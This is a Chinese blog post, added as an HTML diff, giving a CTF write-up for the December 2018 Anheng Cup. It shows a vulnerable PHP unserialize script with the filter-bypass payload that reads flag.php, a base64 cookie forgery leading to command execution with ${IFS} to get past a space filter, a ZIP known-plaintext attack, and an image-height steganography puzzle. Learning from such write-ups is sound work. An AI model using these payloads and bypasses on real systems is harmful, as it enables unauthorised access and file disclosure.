@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前一阵子忙着做课设以及铁三和毛概，没有怎么做题，今天刚好赶上安恒杯，水了一波 签到题 easy这个题算是一个中规中矩的反序列化类型的题目，之前做过比这个还要难的。源码如下:12345678910111213141516171819202122232425262728293031323334353637&amp;lt;?php  @error_reporting(1); include &amp;apos;fla">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒杯12月份部分wp">
+<meta property="og:url" content="http://yoursite.com/2018/12/22/安恒杯12月份部分wp/index.html">
+<meta property="og:site_name" content="Bling_Dog">
+<meta property="og:description" content="之前一阵子忙着做课设以及铁三和毛概，没有怎么做题，今天刚好赶上安恒杯，水了一波 签到题 easy这个题算是一个中规中矩的反序列化类型的题目，之前做过比这个还要难的。源码如下:12345678910111213141516171819202122232425262728293031323334353637&amp;lt;?php  @error_reporting(1); include &amp;apos;fla">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-c683e98bf700b1bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-a5b9facf0357ce8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-aaa900d68fdcb392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-bd69637532e82346.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ff3f26b017d30079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b3ed8787625d0cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-d0462ae85c2b2461.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-7fefe34879e02750.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9baf72476f375e99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-67c57801dcc8a751.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9b08359565e5f0df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9242025d244012e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-d6355f85952f6ca7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-f5b21987152ec2aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-22T12:12:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒杯12月份部分wp">
+<meta name="twitter:description" content="之前一阵子忙着做课设以及铁三和毛概，没有怎么做题，今天刚好赶上安恒杯，水了一波 签到题 easy这个题算是一个中规中矩的反序列化类型的题目，之前做过比这个还要难的。源码如下:12345678910111213141516171819202122232425262728293031323334353637&amp;lt;?php  @error_reporting(1); include &amp;apos;fla">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-c683e98bf700b1bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/22/安恒杯12月份部分wp/">
+
+
+
+
+
+  <title>安恒杯12月份部分wp | Bling_Dog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bling_Dog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">奔向大佬路上的小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/22/安恒杯12月份部分wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bling_Dog">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bling_Dog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安恒杯12月份部分wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-22T18:23:38+08:00">
+                2018-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前一阵子忙着做课设以及铁三和毛概，没有怎么做题，今天刚好赶上安恒杯，水了一波</p>
+<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p><img src="https://upload-images.jianshu.io/upload_images/11234137-c683e98bf700b1bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-c683e98bf700b1bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h1><p>这个题算是一个中规中矩的反序列化类型的题目，之前做过比这个还要难的。源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1); </span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if(isset($this-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">if (isset($_GET[&apos;data&apos;]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[&apos;data&apos;];</span><br><span class="line">    preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;Hacker!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(&quot;./index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>从代码中我们可以看到，flag.php是在当前目录的，我们需要构造baby类的序列化。构造的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    public $file=&quot;flag.php&quot;;</span><br><span class="line">	//this-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        $filename = &quot;./&#123;$this-&gt;file&#125;&quot;; </span><br><span class="line">		//$filename = &quot;&#123;$this-&gt;file&#125;&quot;; </span><br><span class="line">		echo $filename;</span><br><span class="line">        if (file_get_contents($filename))         </span><br><span class="line">        &#123;              </span><br><span class="line">            return file_get_contents($filename); </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;  	</span><br><span class="line">&#125;</span><br><span class="line">$x=new baby();</span><br><span class="line">echo serialize($x);</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>构造出来的序列化字符串为：O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}<br>但是我们不能直接提交上去，因为preg_match(‘/[oc]:\d+:/i’,$data,$matches);会把o:xx这种形式的字符串给过滤掉。找了网上的一个帖子，发现o:+4可以成功绕过，但是浏览器进行url编码于是最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:%2b4:&quot;baby&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-a5b9facf0357ce8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-a5b9facf0357ce8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h1><p>首先上御剑，扫描一波，扫出来一个admin.php，然后发现页面显示you are not admin，这个时候，先看了一下cookie，发现有一个user名称的cookie，cookie值是user的base64编码。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-aaa900d68fdcb392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-aaa900d68fdcb392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>就尝试了一下，将admin进行编码，然后替换掉user的值，发现进入了后台,可以进行命令执行<br><img src="https://upload-images.jianshu.io/upload_images/11234137-bd69637532e82346.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-bd69637532e82346.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>后来在测试的时候发现，题目过滤了空格，所以我们用${IFS}进行代替，尝试了半天，最终在根目录发现了flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-ff3f26b017d30079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ff3f26b017d30079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h1><p>这个题是典型的zip明文攻击的问题，首先我们下载了压缩包，发现压缩包里还有一个压缩包<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b3ed8787625d0cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b3ed8787625d0cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>其中，只要学不死就往死里学是一个加密的压缩文件，里面的内容如下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-d0462ae85c2b2461.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d0462ae85c2b2461.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>发现了蹊跷，虽然这个压缩包是加密的，但是里面的备忘录.txt和上一个压缩包里面的备忘录.txt的CRC32是一样的，这样我们就可以用明文攻击了，使用的软件是ARCHPR，直接挂上开始跑就行了<br><img src="https://upload-images.jianshu.io/upload_images/11234137-7fefe34879e02750.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-7fefe34879e02750.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>最后跑出来之后，打开学习资料那个docx文件，flag就在图片下面。这里要注意的是，flag被出题方隐藏了，需要自己手动设置word里面，有一个显示隐藏字符的选项<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9baf72476f375e99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9baf72476f375e99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="JUJU"><a href="#JUJU" class="headerlink" title="JUJU"></a>JUJU</h1><p>本题是一道隐写题目，上来先看一下图片<br><img src="https://upload-images.jianshu.io/upload_images/11234137-67c57801dcc8a751.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-67c57801dcc8a751.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>刚开始的时候，用binwalk分析，发现出现了一堆看不懂的东西。最后把图片的高度调整了一下，发现了猫腻，最初的图片高度信息为<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9b08359565e5f0df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9b08359565e5f0df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们进行一下修改<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9242025d244012e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9242025d244012e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后再打开图片，就能发现一些信息<br><img src="https://upload-images.jianshu.io/upload_images/11234137-d6355f85952f6ca7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d6355f85952f6ca7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>发现了一串base32的码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33GQZTQMTEM5SGMMTEPU=====</span><br></pre></td></tr></table></figure></p>
+<p>拿去解码，如下:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-f5b21987152ec2aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-f5b21987152ec2aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>得到信息为flag{4382dgdf2d}，题目说，答案是flag里面信息的md5，所以进行md5加密，最终得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a213072327f762855e475779eb081ca3&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/28/安恒杯11月份web/" rel="next" title="安恒杯11月份web部分wp">
+                <i class="fa fa-chevron-left"></i> 安恒杯11月份web部分wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/12/hgame2019/" rel="prev" title="hgame-2019 wp">
+                hgame-2019 wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
+            
+              <p class="site-author-name" itemprop="name">Bling_Dog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#签到题"><span class="nav-number">1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy"><span class="nav-number">2.</span> <span class="nav-text">easy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezweb2"><span class="nav-number">3.</span> <span class="nav-text">ezweb2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#学习资料"><span class="nav-number">4.</span> <span class="nav-text">学习资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JUJU"><span class="nav-number">5.</span> <span class="nav-text">JUJU</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/click.js"></script>
+
